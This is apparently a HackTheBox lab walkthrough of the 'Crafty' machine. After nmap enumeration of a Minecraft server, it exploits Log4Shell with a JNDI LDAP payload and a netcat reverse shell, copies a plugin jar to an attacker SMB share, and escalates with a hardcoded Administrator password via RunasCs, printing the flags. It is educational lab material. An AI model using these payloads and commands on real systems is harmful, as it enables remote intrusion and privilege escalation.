---
title: Crafty
date: 2024-06-23
description: Detailed walkthrough of the Crafty room on HackTheBox platform, covering initial enumeration, exploiting vulnerabilities, and obtaining user and root flags.
draft: false
hideToc: false
enableToc: true
enableTocContent: true
author: g4nd1v
authorEmoji: 👨‍💻
tags:
  - HackTheBox
  - Log4j
  - CVE-2021-44228
categories:
  - HackTheBox
  - HackTheBox/Linux
image: images/Crafty/banner.jpeg
---

# Crafty

| Title       | [Crafty](https://app.hackthebox.com/machines/Crafty)                                                        |
| ----------- | ----------------------------------------------------------------------------------------------------------- |
| Description | HTB Windows Easy Machine                                                                                    |
| Difficulty  | Easy                                                                                                        |
| Maker       | [TheCyberGeek](https://app.hackthebox.com/users/114053) & [felamos](https://app.hackthebox.com/users/27390) |

## Enumeration

Starting with Nmap,

```
└─$ nmap -sC -sV -oA nmap/crafty 10.10.11.249
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-21 07:28 EDT
Nmap scan report for 10.10.11.249
Host is up (0.11s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to http://crafty.htb
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Add `crafty.htb` to `/etc/hosts`. On visiting website, we found another domain - `play.crafty.htb` add that to hosts as well. I have tried to find subdomains using `ffuf` but didn't found any.
As I am clueless now, I have decided to run fuPll nmap scan for all the ports.

```
└─$ nmap -sC -sV -p- -oA nmap/crafty 10.10.11.249
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-21 07:29 EDT
Stats: 0:00:11 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 2.83% done; ETC: 07:35 (0:06:18 remaining)
Nmap scan report for 10.10.11.249
Host is up (0.081s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT      STATE SERVICE   VERSION
80/tcp    open  http      Microsoft IIS httpd 10.0
|_http-title: Did not follow redirect to http://crafty.htb
|_http-server-header: Microsoft-IIS/10.0
25565/tcp open  minecraft Minecraft 1.16.5 (Protocol: 127, Message: Crafty Server, Users: 0/100)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

See, we have another port open that we missed earlier. Port `25565` which is `Minecraft 1.16.5`. We can download Minecraft client from here https://github.com/MCCTeam/Minecraft-Console-Client/releases.

```
└─$ ./MinecraftClient-20240415-263-linux-x64 --help
Minecraft Console Client v1.20.4 - for MC 1.4.6 to 1.20.4 - Github.com/MCCTeam
GitHub build 263, built on 2024-04-15 from commit 403284c
Command-Line Help:
MinecraftClient.exe <username> <password> <server>
MinecraftClient.exe <username> <password> <server> "/mycommand"
MinecraftClient.exe --setting=value [--other settings]
MinecraftClient.exe --section.setting=value [--other settings]
MinecraftClient.exe <settings-file.ini> [--other settings]
```

Joining server with username and password

```
└─$ ./MinecraftClient-20240415-263-linux-x64 g4nd1v '' 10.10.11.249
Minecraft Console Client v1.20.4 - for MC 1.4.6 to 1.20.4 - Github.com/MCCTeam
GitHub build 263, built on 2024-04-15 from commit 403284c
Password(invisible):
You chose to run in offline mode.
Retrieving Server Info...
Server version : 1.16.5 (protocol v754)
[MCC] Version is supported.
Logging in...
[MCC] Server is in offline mode.
[MCC] Server was successfully joined.
Type '/quit' to leave the server.
>
```

## User Flag

Download Log4j POC from github - https://github.com/kozmer/log4j-shell-poc
Change line 26 from `String cmd="/bin/sh";` to `String cmd="cmd.exe";` and run this command to start the POC script.
`python3 poc.py --userip 10.10.14.166 --webport 8000 --lport 9001` also start netcat listener on other tab - `nc -lvnp 9001` and paste the generated `${jndi:ldap://10.10.14.29:1389}/a` into Minecraft server.
![[Pasted image 20240623163938.png]]

```shell
c:\Users\svc_minecraft\Desktop>type user.txt
7285f344585dc116f9d03b900d275e05
```

## Root Flag

There is a `playercounter-1.0-SNAPSHOT.jar` file in `c:\Users\svc_minecraft\server\plugins`, so we will download the file and inspect if we can find anything interesting into it.
In order to transfer file, we will use `smbserver` from `impacket` - start smbserver with this command on our machine `smbserver.py share . -smb2support` and then copy the file.
`copy playercounter-1.0-SNAPSHOT.jar \\10.10.14.166\share\`
But, we cannot be able to copy because it is not allowed by the host. So we will use username and password to login.

```
1. Use smbserver with username and password on attacker (our) machine
smbserver.py share . -smb2support -username g4nd1v -password g4nd1v

2. allow share from host machine
net use \\10.10.14.166\share /u:g4nd1v g4nd1v

3. Now send the file
copy playercounter-1.0-SNAPSHOT.jar \\10.10.14.166\share\
```

Perfect, now we got the file, we will use online java decompiler to perform our task - https://jdec.app/
![[Pasted image 20240623165903.png]]
Here, in the `Playercounter.class` there is a hardcoded password `s67u84zKq8IXw`. Maybe of Administrator? Let's check.
Transfer `RunasCs` from https://github.com/antonioCoco/RunasCs and then run it in our shell.

```shell
c:\Users\svc_minecraft\Desktop>RunasCs.exe Administrator s67u84zKq8IXw "cmd /c whoami"
crafty\administrator

c:\Users\svc_minecraft\Desktop>.\RunasCs.exe Administrator s67u84zKq8IXw "cmd /c type C:\Users\Administrator\Desktop\root.txt"
1ed2d80a98dec60ac1f21c1f5b981b2e
```
